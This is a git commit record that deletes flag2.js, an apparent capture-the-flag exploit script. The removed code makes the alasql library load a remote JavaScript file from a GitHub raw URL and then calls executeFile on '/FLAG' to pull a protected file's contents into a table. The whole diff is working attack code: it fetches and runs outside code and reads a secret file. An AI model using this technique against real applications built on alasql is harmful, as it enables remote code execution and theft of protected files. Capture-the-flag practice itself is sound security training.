ec3e2d15f9bb9723b1e5822fd18e1e67f1b72f1a
vr2 <hydw9898@gmail.com>
2024-11-15 09:44:38 +0900

    Delete flag2.js

--- flag2.js
+++
@@ -1,9 +0,0 @@
-const alasql = require('alasql');
-
-alasql('REQUIRE "https://raw.githubusercontent.com/vr2/1/refs/heads/main/flag.js"');
-
-alasql('CREATE TABLE genie (content TEXT)');
-alasql.tables.genie.data = [
-    {content:"test"}
-];
-alasql('INSERT INTO genie VALUES (executeFile("/FLAG"))');
